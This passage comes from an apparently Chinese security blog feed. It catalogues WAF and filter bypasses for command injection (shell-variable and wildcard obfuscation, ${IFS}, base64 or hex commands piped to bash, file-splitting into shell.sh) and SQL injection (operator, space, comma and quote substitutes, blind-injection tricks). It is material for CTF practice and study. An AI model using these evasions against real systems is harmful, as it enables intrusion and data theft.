class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)<br></code></pre></td></tr></table></figure><p><strong>利用Shell特殊变量绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>$*ami<br><span class="hljs-built_in">who</span><span class="hljs-variable">$@ami</span><br><span class="hljs-built_in">who</span><span class="hljs-variable">$1ami</span><br></code></pre></td></tr></table></figure><p><strong>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/u?r/</span>b?n/who?mi<br><span class="hljs-regexp">/*/</span>*/whoam?<br><span class="hljs-regexp">/*/</span>*i[n]/wh??mi<br></code></pre></td></tr></table></figure><p><strong>综合组合</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/*<span class="hljs-regexp">/*&quot;&quot;in/w</span><span class="hljs-string">&#x27;h&#x27;</span><span class="hljs-string">`dfds`</span><span class="hljs-string">??</span>m<span class="hljs-variable">$(</span>sdf)i<br></code></pre></td></tr></table></figure><h2 id="2-4-linux切割字符串（linux区分大小写）"><a href="#2-4-linux切割字符串（linux区分大小写）" class="headerlink" title="2.4 linux切割字符串（linux区分大小写）"></a>2.4 linux切割字符串（linux区分大小写）</h2><p>在linux中切割字符串的语法是${NAME:start:length}</p><p>与Windows相同这里不在赘述，只要区分大小写就可以</p><h2 id="2-5-绕过空格过滤"><a href="#2-5-绕过空格过滤" class="headerlink" title="2.5 绕过空格过滤"></a>2.5 绕过空格过滤</h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，"><a href="#在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，" class="headerlink" title="在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，"></a>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</h3><h3 id="利用大括号来绕过空格限制"><a href="#利用大括号来绕过空格限制" class="headerlink" title="利用大括号来绕过空格限制"></a>利用大括号来绕过空格限制</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;ls,-al&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;ping,-c,2,127.0.0.1&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAlewLe6MhQ3jwEibx7xia9Qjva7b8a6ibG1Ogd8CHvxXNFMKCsVdmSicRmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="IFS-绕过空格"><a href="#IFS-绕过空格" class="headerlink" title="${IFS}绕过空格"></a>${IFS}绕过空格</h3><p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAsDiaqTYPO5oZHEVtvSORgXxD1YY8OwvzaicZHpVqicW3vOjQvkLAxc1FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA93kRHZJujhAc10zNhGlQg9Bt4Gj5LU4VgByMuIDmnhC72gua0RATVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>2.6 利用base64绕过命令限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>|<span class="hljs-built_in">base64</span> //先输出<span class="hljs-built_in">whoami</span>的<span class="hljs-built_in">base64</span>编码<br>`<span class="hljs-built_in">echo</span> dwhvYW1pCg==|<span class="hljs-built_in">base64</span> -d` //将其<span class="hljs-built_in">base64</span>解码<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6hz2deFGTib0PPtt2WzkFMNllicCiaYGB6xDDBsibnDbqJyiaick1MTq7jIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="2-7-hex编码绕过"><a href="#2-7-hex编码绕过" class="headerlink" title="2.7 hex编码绕过"></a>2.7 hex编码绕过</h2><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs wren"># <span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">63617420666</span>c61672e706870<br><span class="hljs-variable">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span><span class="hljs-operator">|</span><span class="hljs-variable">xxd</span> <span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span><span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br><span class="hljs-comment">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件</span><br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span>参数：逆向转换。将<span class="hljs-number">16</span>进制字符串表示转为实际的数<br>#<span class="hljs-operator">-</span><span class="hljs-variable">ps</span>参数：以 <span class="hljs-variable">postscript</span>的连续<span class="hljs-number">16</span>进制转储输出，也叫做纯<span class="hljs-number">16</span>进制转储。<br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span>将纯十六进制转储的反向输出打印为了<span class="hljs-variable">ASCII</span>格式。<br><br><span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> \<span class="hljs-variable">x63</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x74</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">x66</span>\<span class="hljs-variable">x6c</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x67</span>\<span class="hljs-variable">x2e</span>\<span class="hljs-variable">x70</span>\<span class="hljs-variable">x68</span>\<span class="hljs-variable">x70</span><br>#经测试，发现在<span class="hljs-variable">php</span>的<span class="hljs-variable">ping</span>环境上执行失败。在<span class="hljs-variable">linux</span>系统上执行成功<br>$(<span class="hljs-variable">printf</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>)<br>&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;<span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br>`&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;`<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAdMib5bhRgCaibL5dibgf00ichGgSHYpp4NuDllUiaU1N4QNlVRvNpfZ1WlA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="2-8-长度限制绕过"><a href="#2-8-长度限制绕过" class="headerlink" title="2.8 长度限制绕过"></a>2.8 长度限制绕过</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>可以利用base64解码的方式将脚本写入多个文件合并后再执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cat flag.txt&quot;</span> | base64   # 首先生成所需命令的base64字符串<br><br># Y2F0IGZsYWcudHh0Cg==<br><span class="hljs-keyword">echo</span> -n Y2F0IG &gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">echo</span> -n ZsYWcu &gt;<span class="hljs-keyword">b</span><br><span class="hljs-keyword">echo</span> -n dHh0Cg== &gt; <span class="hljs-keyword">c</span><br><br>下面合并文件<br><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">b</span> &gt;&gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">c</span> &gt;&gt; <span class="hljs-keyword">a</span><br><br>解码文件<br><br>base64 -d <span class="hljs-keyword">a</span> &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAD3FClyNFl6stkujd7iaicbb4HFcUJtibWCtwOCP3iage4zcmopdVSdWYqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">首先通过命令创建带有命令分隔的文件<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;txt&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ag.\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;fl\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;t \\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ca\\&quot;</span></span><br>在用ls -t输出到一个文件中，再利用sh执行<br>ls -t &gt; shell2.sh<br>#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即<br>ls -at &gt; shell2.sh<br>sh shell2.sh<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7Wyk3S43efk4SEDLkPtDiao9DCaicbwSFd2pB6aiaEAf3ERg2XLAmwStQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>参考：</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">https://www.anquanke.com/post/id/<span class="hljs-number">208398</span><br>https://<span class="hljs-keyword">update</span>.venuseye.com.cn/reports/<span class="hljs-number">1548417941041</span>/<span class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A5Emotet</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%BE</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%85</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%88</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%90CMD</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%91</span><span class="hljs-meta">%BD</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%8A</span><span class="hljs-meta">%80</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9C</span><span class="hljs-meta">%AF20181212</span>.html<br>https://blog.csdn.net/whuslei/article/details/<span class="hljs-number">7187639</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF绕过</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入绕过</title>
    <link href="/2022/06/16/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/2022/06/16/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。</p><h4 id="0x00-基本问题"><a href="#0x00-基本问题" class="headerlink" title="0x00 基本问题"></a>0x00 基本问题</h4><p>sql注入过程中，为了防止注入，代码中一般会进行输入字符的过滤或拦截。其中过滤指的是输入的内容被删除or替换成了别的字符，拦截指的是检测到指定内容存在后，直接返回错误，不再进行后续的操作。</p><h4 id="0x01-and-or"><a href="#0x01-and-or" class="headerlink" title="0x01 and&#x2F;or"></a>0x01 and&#x2F;or</h4><p>1.尝试双写or大小写绕过</p><p>2.运算符代替:<code>&amp;&amp;</code>,<code>||</code></p><p>3.<code>^</code>运算符，例如:?id&#x3D;1^(1&#x3D;0) (1^0&#x3D;1,故返回id&#x3D;1的数据)</p><p>4.拼接<code>=</code>运算符，例如:?id&#x3D;1&#x3D;(1&#x3D;1) (1&#x3D;1为真，故返回id&#x3D;true即id&#x3D;1的数据(true&#x3D;1))</p><h4 id="0x02-空格"><a href="#0x02-空格" class="headerlink" title="0x02 空格"></a>0x02 空格</h4><p>1.注释&#x2F;**&#x2F;代替</p><p>2.<code>and/or</code>后面可以加偶数个<code>!或~</code>可以替代空格，也可以混合使用</p><p>3.<code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符绕过</p><p>4.巧用括号</p><h4 id="0x03-括号"><a href="#0x03-括号" class="headerlink" title="0x03 括号"></a>0x03 括号</h4><p>使用order by进行盲注，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,&#123;<span class="hljs-string">&#x27;1&#x27;</span>&#125; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>通过修改大括号中的值，即可进行指定字符串与目标未知字符串的比较，如果大于则位置字符串排在前，如果小于则指定字符串排在前。通过limit来控制显示问题。由此可通过编写脚本进行注入。</p><h4 id="0x04-逗号"><a href="#0x04-逗号" class="headerlink" title="0x04 逗号"></a>0x04 逗号</h4><p>1.盲注</p><p>2.使用join语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p><h4 id="0x05-引号"><a href="#0x05-引号" class="headerlink" title="0x05 引号"></a>0x05 引号</h4><p>1.考虑宽字节注入(存在编码问题时)</p><p>2.引号逃逸(当存在两个或以上数据输入时，通过\可以转义一个单引号，随后在下一个输入框or字段中写入注入代码，最后添加注释符，这时可巧妙的避开引号闭合问题)</p><h4 id="0x06-注释"><a href="#0x06-注释" class="headerlink" title="0x06 注释"></a>0x06 注释</h4><p>1.巧妙闭合单引号，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span>;<br>注入代码：?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; union select 1,2,&#x27;</span>3<br></code></pre></td></tr></table></figure><h4 id="0x07-数字"><a href="#0x07-数字" class="headerlink" title="0x07 数字"></a>0x07 数字</h4><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th></th><th></th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi());~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) &#x2F;&#x2F;注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><h4 id="0x08-等于号，大于号，小于号"><a href="#0x08-等于号，大于号，小于号" class="headerlink" title="0x08 等于号，大于号，小于号"></a>0x08 等于号，大于号，小于号</h4><p>等于号可以通过like绕过，大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p><h4 id="0x09-常见函数-符号总结"><a href="#0x09-常见函数-符号总结" class="headerlink" title="0x09 常见函数&#x2F;符号总结"></a>0x09 常见函数&#x2F;符号总结</h4><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><table><thead><tr><th>单行注释</th><th>单行注释</th><th>单行注释</th><th>多行(内联)注释</th></tr></thead><tbody><tr><td><code>#</code></td><td><code>-- x //x为任意字符</code></td><td><code>;%00</code></td><td><code>/*任意内容*/</code></td></tr></tbody></table><h5 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h5><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th><th></th><th></th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and。</td><td>\</td><td>\</td><td></td><td>或，同or。</td></tr><tr><td>!</td><td>非，同not。</td><td>~</td><td>一元比特反转。</td><td></td><td></td></tr><tr><td>^</td><td>异或，同xor。</td><td>+</td><td>加，可替代空格，如<code>select+user()</code>。</td><td></td><td></td></tr></tbody></table><h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同SCHEMA()。</td></tr><tr><td>VERSION()</td><td>获取当前版本信息。</td></tr></tbody></table><h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值。</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code>。</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td></tr></tbody></table><h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取&#x2F;拼接"></a>字符截取&#x2F;拼接</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度。</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从<strong>最左边</strong>截取指定长度。</td></tr><tr><td><strong>RPAD(str,len,padstr)</strong></td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td></tr><tr><td><strong>LPAD(str,len,padstr)</strong></td><td>与RPAD相似，在<code>str</code>左边补齐。</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code>。</td></tr><tr><td><strong>INSERT(str,pos,len,newstr)</strong></td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td><strong>MAKE_SET(bits,str1,str2,…)</strong></td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td></tr></tbody></table><h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p><h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数&#x2F;语句"></a>其他常用函数&#x2F;语句</h5><table><thead><tr><th>函数&#x2F;语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度。</td></tr><tr><td>PI()</td><td>返回π的具体数值。</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值。</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值。</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同。</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置。</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code>。</td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集。</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td></tr></tbody></table><h4 id="0x0a-handler语句代替select-mysql"><a href="#0x0a-handler语句代替select-mysql" class="headerlink" title="0x0a handler语句代替select[mysql]"></a>0x0a handler语句代替select[mysql]</h4><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。[故其他数据库不可用]</p></blockquote><p>语法结构：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> <span class="hljs-comment">[ <span class="hljs-comment">[AS]</span> alias]</span><br><br>HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;<br>    <span class="hljs-comment">[ WHERE where_condition ]</span> <span class="hljs-comment">[LIMIT ... ]</span><br>HANDLER tbl_name READ &#123; FIRST 